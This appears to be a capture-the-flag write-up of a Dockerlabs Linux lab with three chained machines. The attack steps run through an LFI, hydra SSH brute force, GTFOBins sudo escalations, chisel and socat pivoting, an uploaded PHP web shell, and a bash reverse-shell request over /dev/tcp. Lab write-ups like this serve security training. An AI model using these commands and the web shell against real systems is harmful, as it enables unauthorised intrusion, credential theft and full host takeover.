---
date: 2024-09-20
categories: [Linux, Medium]
---

![image](https://github.com/user-attachments/assets/bb0e3da1-16cb-45b5-8aaa-83ceb2d81ed6)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [El pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)         | [Dockerlabs](https://dockerlabs.es/)     | Medium           | Linux   |

---








- I start scaning the open ports
    
    ```bash
    nmap -p- -vvv -sS --min-rate 5000 -Pn 10.10.10.2 -oG scan
    ```
    
    ![image 1](https://github.com/user-attachments/assets/c9f4e387-d513-4475-98cc-5794f733def5)

    

- Scanning open ports
    
    ```bash
    nmap -p22,80 -sCV 10.10.10.2 -oN ports
    ```
    
    ![image 2](https://github.com/user-attachments/assets/34723c1b-b745-4d0e-92ac-650f70fb379d)

    

- We enter the website
    
    ![image 3](https://github.com/user-attachments/assets/b009561c-4997-46aa-b0c2-17fe5f47c86a)

    

- We check the technologies being used by the web application
    
    ```bash
    whatweb 10.10.10.2
    ```
    
    ![image 4](https://github.com/user-attachments/assets/7362722a-a7fd-4e07-96ea-feb25c851cdd)

    

- We perform fuzzing to try to find directories
    
    ```bash
    gobuster dir -u http://10.10.10.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
    ```
    
    ![image 5](https://github.com/user-attachments/assets/36b52e26-f5c6-4b9b-b4d9-fbffdc4caf4f)

    

- I access the website `http://10.10.10.2/shop/`
    
    ![image 6](https://github.com/user-attachments/assets/b58ca28b-f2b5-4f14-9e14-935183aa164b)

    

- It seems that the web page has a parameter with which I can try to load a local file (`LFI`)
    
    ![image 7](https://github.com/user-attachments/assets/8ef7b4c8-659b-47c1-a721-ed1dd5178487)

    

- With the absolute path it does not load anything. When trying with relative paths I managed to load files
    
    ![image 8](https://github.com/user-attachments/assets/562dbb83-78fc-4ed1-a847-f1b12a875862)

    

- I discovered two users, `seller` and `manchi`. I make a brute force attack to try to connect via ssh with one of these users
- With the user `seller` I could not get his password but I could with `manchi`
    
    ```bash
    hydra -l manchi -P /usr/share/wordlist/rockyou.txt ssh://10.10.10.2
    ```
    
    ![image 9](https://github.com/user-attachments/assets/de2f3f21-3099-4bf1-93bb-a41dc5a6d499)

    

- I try to connected via ssh and after searching for a while for ways to escalate our privileges but I don´t found nothing. I tried to brute force with the user `seller`
    [Sudo_BruteForce](https://github.com/Maalfer/Sudo_BruteForce)
    
    ```bash
    ./Linux-Su-Force.sh seller rockyou.txt
    ```
    
    ![image 10](https://github.com/user-attachments/assets/31421030-7368-475e-ada8-846fb73aeb85)

    

- I connect as seller and list the commands that I can execute as sudo without providing a password
    
    ```bash
    sudo -l
    ```
    
    ![image 11](https://github.com/user-attachments/assets/ad8bd9d9-3ca3-4560-8018-7146e3b93ef6)

    

- I search in gtfobins for ways to escalate privileges with sudo php and become root
    
    [GTFOBins](https://gtfobins.github.io/)
    
    ```bash
    CMD="/bin/sh"
    sudo php -r "system('$CMD');"
    ```
    
    ![image 12](https://github.com/user-attachments/assets/0cf33d8f-c7df-4e6d-866a-19ad175f50a5)

    

- I find out which ips this computer has 'hostname -I'. I apply a reconnaissance to see what other hosts are on network 20.20.20.0/24
    
    ```bash
    #!/bin/bash
    
    for i in $(seq 1 254); do
    	for port in 21 22 80 443 445 8080; do
    		timeout 1 bash -c "echo '' > /dev/tcp/20.20.20.$i/$port" &>/dev/null && echo "[+] Host 20.20.20.$i - PORT $port - OPEN" &
    	done
    done; wait
    
    ```
    
    ![image 13](https://github.com/user-attachments/assets/e32bed7a-3135-41bb-bc93-99ffc610c73c)

    

- I create a tunnel between the two machines using `chisel`
    
    ```bash
    #Execute this from your machine
    ./chisel server --reverse -p 1234
    
    #Execute this from the 10.10.10.2 machine
    ./chisel client 10.10.10.1:1234 R:1080:socks
    ```
    
    ![image 14](https://github.com/user-attachments/assets/237e7876-f4ef-434a-9471-5a057fa3c94a)

    
    ![image 15](https://github.com/user-attachments/assets/7d3e68cd-f442-48c4-bf18-8e03bfd25e23)

    
    - Add in `/etc/proxychains4.conf` the following line
        
        ```bash
        socks5 127.0.0.1 1080
        ```
        

- As we see that you have a web service on port 80, we perform an enumeration and find a secret.php file.
    
    ```bash
    gobuster dir -u http://20.20.20.3/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --proxy socks5://127.0.0.1:1080 -t 5 -x .php,.txt
    ```
    
    ![image 16](https://github.com/user-attachments/assets/4f1e30b3-f8cd-4401-a107-83760a14c036)

    

- We access the page defining a proxy and see a potential user
    
    ![image 17](https://github.com/user-attachments/assets/2d350fdb-8228-4fe2-85db-df1b3ea3162b)

    
    ![image 18](https://github.com/user-attachments/assets/e2c78509-a865-49f1-abd7-d74a2ff470e2)

    

- We make a brute force attack to try to connect via ssh
    
    ```bash
    proxychains4 hydra -l mario -P /usr/share/wordlist/rockyou.txt ssh://20.20.20.3 2>/dev/null
    ```
    
    ![image 19](https://github.com/user-attachments/assets/41eb500e-8443-4b5b-b68d-2741aa4304bd)

    

- I connect via ssh and see what commands you can execute as sudo without providing a password
    
    ![image 20](https://github.com/user-attachments/assets/8fe80456-9bba-4e31-85b0-9a24db2e11d3)

    

- I search in gtfobins for ways to escalate privileges with sudo vim and become root
    
    ```bash
    sudo vim -c ':!/bin/sh'
    ```
    
    ![image 21](https://github.com/user-attachments/assets/38ae33ba-b7c3-4c56-b1ac-9457a5708bce)

    

- I find out which ips this computer has 'hostname -I'. I apply a reconnaissance to see what other hosts are on network 30.30.30.0/24
    
    ![image 22](https://github.com/user-attachments/assets/9c37d0a7-6c05-40a8-8bfc-6eeff3f1f009)

    

- I create a tunnel between the three machines using `chisel` and `socat`
    
    ```bash
    ./chisel client 20.20.20.2:4237 R:8888:socks
    
    ./socat TCP-LISTEN:4237,fork TCP:10.10.10.1:1234
    ```
    
    ![image 23](https://github.com/user-attachments/assets/195ff51e-328f-4c55-8e67-6d8ab8f4164a)

    
    ![image 24](https://github.com/user-attachments/assets/628c4d59-3a5e-470d-9dd7-e302ffc31b80)

    
    - Add in `/etc/proxychains4.conf` the following line
        
        ```bash
        socks5 127.0.0.1 8888
        ```
        

- I scanned the 5000 most common ports and found port 80 open.
    
    ```bash
    nmap -sT -Pn --top-ports 5000 -open- --min-rate 5000 -vvv -n 30.30.30.3 2>/dev/null
    ```
    
    ![image 25](https://github.com/user-attachments/assets/df89e748-4ca2-4bd3-b383-b77690206ff5)

    

- I try to upload a php file with which I can execute commands (`RCE`)
    
    ![image 26](https://github.com/user-attachments/assets/7d181ac8-982a-41b5-bbef-4c249685fd2d)

    
    ![image 27](https://github.com/user-attachments/assets/3d56580d-0db1-4e6c-8f36-4bd82d8e8adc)

    

```bash
<?php 
	system($_GET['cmd']);
?>
```

- I perform fuzzing to find directories
    
    ```bash
    gobuster dir -u http://30.30.30.3/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --proxy socks5://127.0.0.1:8888
    ```
    
    ![image 28](https://github.com/user-attachments/assets/df947804-acd2-46e2-b2e3-76e7d06aed88)

    

- I find where the file we have just uploaded is located and see that I can execute the following commands
    
    ![image 29](https://github.com/user-attachments/assets/732741c8-3ba3-453a-bd04-5a70303223b2)

    

- I create a tunnel so that when doing a reverse shell I get to our computer.
    
    ```bash
    #Victim 1 (10.10.10.2)
    ./socat TCP-LISTEN:4342,fork TCP:10.10.10.1:4341
    
    #Victim 2 (20.20.20.3)
    ./socat TCP-LISTEN:4343,fork TCP:20.20.20.2:4342
    ```
    
    ![image 30](https://github.com/user-attachments/assets/c05cf7f9-43e7-4533-b507-6abf987ba7b1)

    
    ![image 31](https://github.com/user-attachments/assets/3e4b6f93-d5b7-4bfd-b8b4-54b5dad313fe)

    

- I make the request to create the reverse shell
    
    ```bash
    http://30.30.30.3/uploads/a.php?cmd=bash -c "bash -i >%26 /dev/tcp/30.30.30.2/4343 0>%261"
    ```

    ![image 32](https://github.com/user-attachments/assets/7cfc766d-20e6-4f4d-81d3-34cb5642c072)

    

- I connect as www-data and list the commands that I can execute as sudo without providing a password
    
    ![image 33](https://github.com/user-attachments/assets/2187889a-e248-47bf-93e8-deec77345c22)

    

- I search in gtfobins for ways to escalate privileges with sudo env and become root
    
    ```bash
    sudo env /bin/sh
    ```
    
    ![image 34](https://github.com/user-attachments/assets/4c8aacb3-4727-4f7d-84d0-ffe634a99fd7)
